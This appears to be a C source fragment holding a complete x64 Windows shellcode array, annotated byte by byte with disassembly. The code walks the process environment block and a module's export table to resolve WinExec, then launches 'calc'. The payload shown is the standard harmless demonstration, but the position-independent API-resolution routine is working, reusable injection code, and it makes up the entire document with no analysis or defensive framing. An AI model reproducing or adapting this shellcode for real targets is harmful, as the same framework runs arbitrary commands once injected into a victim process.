
#define CALC_SIZE 344

char CALC[] = {
  /* 0000 */ "\x48\x8b\xc4"                         /* mov rax, rsp                     */
  /* 0003 */ "\x48\x83\xec\x38"                     /* sub rsp, 0x38                    */
  /* 0007 */ "\x83\x60\xf4\x00"                     /* and dword [rax-0xc], 0x0         */
  /* 000B */ "\x48\x8d\x48\xe8"                     /* lea rcx, [rax-0x18]              */
  /* 000F */ "\xc7\x40\xe8\x57\x69\x6e\x45"         /* mov dword [rax-0x18], 0x456e6957 */
  /* 0016 */ "\xc7\x40\xec\x78\x65\x63\x00"         /* mov dword [rax-0x14], 0x636578   */
  /* 001D */ "\xc7\x40\xf0\x63\x61\x6c\x63"         /* mov dword [rax-0x10], 0x636c6163 */
  /* 0024 */ "\xe8\xb3\x00\x00\x00"                 /* call 0xdc                        */
  /* 0029 */ "\x48\x85\xc0"                         /* test rax, rax                    */
  /* 002C */ "\x74\x0c"                             /* jz 0x3a                          */
  /* 002E */ "\xba\x05\x00\x00\x00"                 /* mov edx, 0x5                     */
  /* 0033 */ "\x48\x8d\x4c\x24\x28"                 /* lea rcx, [rsp+0x28]              */
  /* 0038 */ "\xff\xd0"                             /* call rax                         */
  /* 003A */ "\x33\xc0"                             /* xor eax, eax                     */
  /* 003C */ "\x48\x83\xc4\x38"                     /* add rsp, 0x38                    */
  /* 0040 */ "\xc3"                                 /* ret                              */
  /* 0041 */ "\xcc"                                 /* int3                             */
  /* 0042 */ "\xcc"                                 /* int3                             */
  /* 0043 */ "\xcc"                                 /* int3                             */
  /* 0044 */ "\x48\x8b\xc4"                         /* mov rax, rsp                     */
  /* 0047 */ "\x48\x89\x58\x08"                     /* mov [rax+0x8], rbx               */
  /* 004B */ "\x48\x89\x68\x10"                     /* mov [rax+0x10], rbp              */
  /* 004F */ "\x48\x89\x70\x18"                     /* mov [rax+0x18], rsi              */
  /* 0053 */ "\x48\x89\x78\x20"                     /* mov [rax+0x20], rdi              */
  /* 0057 */ "\x41\x54"                             /* push r12                         */
  /* 0059 */ "\x41\x56"                             /* push r14                         */
  /* 005B */ "\x41\x57"                             /* push r15                         */
  /* 005D */ "\x48\x83\xec\x20"                     /* sub rsp, 0x20                    */
  /* 0061 */ "\x48\x63\x41\x3c"                     /* movsxd rax, dword [rcx+0x3c]     */
  /* 0065 */ "\x48\x8b\xd9"                         /* mov rbx, rcx                     */
  /* 0068 */ "\x4c\x8b\xe2"                         /* mov r12, rdx                     */
  /* 006B */ "\x8b\x8c\x08\x88\x00\x00\x00"         /* mov ecx, [rax+rcx+0x88]          */
  /* 0072 */ "\x85\xc9"                             /* test ecx, ecx                    */
  /* 0074 */ "\x74\x37"                             /* jz 0xad                          */
  /* 0076 */ "\x48\x8d\x04\x0b"                     /* lea rax, [rbx+rcx]               */
  /* 007A */ "\x8b\x78\x18"                         /* mov edi, [rax+0x18]              */
  /* 007D */ "\x85\xff"                             /* test edi, edi                    */
  /* 007F */ "\x74\x2c"                             /* jz 0xad                          */
  /* 0081 */ "\x8b\x70\x1c"                         /* mov esi, [rax+0x1c]              */
  /* 0084 */ "\x44\x8b\x70\x20"                     /* mov r14d, [rax+0x20]             */
  /* 0088 */ "\x48\x03\xf3"                         /* add rsi, rbx                     */
  /* 008B */ "\x8b\x68\x24"                         /* mov ebp, [rax+0x24]              */
  /* 008E */ "\x4c\x03\xf3"                         /* add r14, rbx                     */
  /* 0091 */ "\x48\x03\xeb"                         /* add rbp, rbx                     */
  /* 0094 */ "\xff\xcf"                             /* dec edi                          */
  /* 0096 */ "\x49\x8b\xcc"                         /* mov rcx, r12                     */
  /* 0099 */ "\x41\x8b\x14\xbe"                     /* mov edx, [r14+rdi*4]             */
  /* 009D */ "\x48\x03\xd3"                         /* add rdx, rbx                     */
  /* 00A0 */ "\xe8\x87\x00\x00\x00"                 /* call 0x12c                       */
  /* 00A5 */ "\x85\xc0"                             /* test eax, eax                    */
  /* 00A7 */ "\x74\x25"                             /* jz 0xce                          */
  /* 00A9 */ "\x85\xff"                             /* test edi, edi                    */
  /* 00AB */ "\x75\xe7"                             /* jnz 0x94                         */
  /* 00AD */ "\x33\xc0"                             /* xor eax, eax                     */
  /* 00AF */ "\x48\x8b\x5c\x24\x40"                 /* mov rbx, [rsp+0x40]              */
  /* 00B4 */ "\x48\x8b\x6c\x24\x48"                 /* mov rbp, [rsp+0x48]              */
  /* 00B9 */ "\x48\x8b\x74\x24\x50"                 /* mov rsi, [rsp+0x50]              */
  /* 00BE */ "\x48\x8b\x7c\x24\x58"                 /* mov rdi, [rsp+0x58]              */
  /* 00C3 */ "\x48\x83\xc4\x20"                     /* add rsp, 0x20                    */
  /* 00C7 */ "\x41\x5f"                             /* pop r15                          */
  /* 00C9 */ "\x41\x5e"                             /* pop r14                          */
  /* 00CB */ "\x41\x5c"                             /* pop r12                          */
  /* 00CD */ "\xc3"                                 /* ret                              */
  /* 00CE */ "\x0f\xb7\x44\x7d\x00"                 /* movzx eax, word [rbp+rdi*2]      */
  /* 00D3 */ "\x8b\x04\x86"                         /* mov eax, [rsi+rax*4]             */
  /* 00D6 */ "\x48\x03\xc3"                         /* add rax, rbx                     */
  /* 00D9 */ "\xeb\xd4"                             /* jmp 0xaf                         */
  /* 00DB */ "\xcc"                                 /* int3                             */
  /* 00DC */ "\x48\x89\x5c\x24\x08"                 /* mov [rsp+0x8], rbx               */
  /* 00E1 */ "\x57"                                 /* push rdi                         */
  /* 00E2 */ "\x48\x83\xec\x20"                     /* sub rsp, 0x20                    */
  /* 00E6 */ "\x65\x48\x8b\x04\x25\x60\x00\x00\x00" /* mov rax, [gs:0x60]               */
  /* 00EF */ "\x48\x8b\xf9"                         /* mov rdi, rcx                     */
  /* 00F2 */ "\x45\x33\xc0"                         /* xor r8d, r8d                     */
  /* 00F5 */ "\x48\x8b\x50\x18"                     /* mov rdx, [rax+0x18]              */
  /* 00F9 */ "\x48\x8b\x5a\x10"                     /* mov rbx, [rdx+0x10]              */
  /* 00FD */ "\xeb\x16"                             /* jmp 0x115                        */
  /* 00FF */ "\x4d\x85\xc0"                         /* test r8, r8                      */
  /* 0102 */ "\x75\x1a"                             /* jnz 0x11e                        */
  /* 0104 */ "\x48\x8b\xd7"                         /* mov rdx, rdi                     */
  /* 0107 */ "\x48\x8b\xc8"                         /* mov rcx, rax                     */
  /* 010A */ "\xe8\x35\xff\xff\xff"                 /* call 0x44                        */
  /* 010F */ "\x48\x8b\x1b"                         /* mov rbx, [rbx]                   */
  /* 0112 */ "\x4c\x8b\xc0"                         /* mov r8, rax                      */
  /* 0115 */ "\x48\x8b\x43\x30"                     /* mov rax, [rbx+0x30]              */
  /* 0119 */ "\x48\x85\xc0"                         /* test rax, rax                    */
  /* 011C */ "\x75\xe1"                             /* jnz 0xff                         */
  /* 011E */ "\x48\x8b\x5c\x24\x30"                 /* mov rbx, [rsp+0x30]              */
  /* 0123 */ "\x49\x8b\xc0"                         /* mov rax, r8                      */
  /* 0126 */ "\x48\x83\xc4\x20"                     /* add rsp, 0x20                    */
  /* 012A */ "\x5f"                                 /* pop rdi                          */
  /* 012B */ "\xc3"                                 /* ret                              */
  /* 012C */ "\x44\x8a\x01"                         /* mov r8b, [rcx]                   */
  /* 012F */ "\x45\x84\xc0"                         /* test r8b, r8b                    */
  /* 0132 */ "\x74\x1a"                             /* jz 0x14e                         */
  /* 0134 */ "\x41\x8a\xc0"                         /* mov al, r8b                      */
  /* 0137 */ "\x48\x2b\xca"                         /* sub rcx, rdx                     */
  /* 013A */ "\x44\x8a\xc0"                         /* mov r8b, al                      */
  /* 013D */ "\x3a\x02"                             /* cmp al, [rdx]                    */
  /* 013F */ "\x75\x0d"                             /* jnz 0x14e                        */
  /* 0141 */ "\x48\xff\xc2"                         /* inc rdx                          */
  /* 0144 */ "\x8a\x04\x11"                         /* mov al, [rcx+rdx]                */
  /* 0147 */ "\x44\x8a\xc0"                         /* mov r8b, al                      */
  /* 014A */ "\x84\xc0"                             /* test al, al                      */
  /* 014C */ "\x75\xec"                             /* jnz 0x13a                        */
  /* 014E */ "\x0f\xb6\x0a"                         /* movzx ecx, byte [rdx]            */
  /* 0151 */ "\x41\x0f\xb6\xc0"                     /* movzx eax, r8b                   */
  /* 0155 */ "\x2b\xc1"                             /* sub eax, ecx                     */
  /* 0157 */ "\xc3"                                 /* ret                              */
};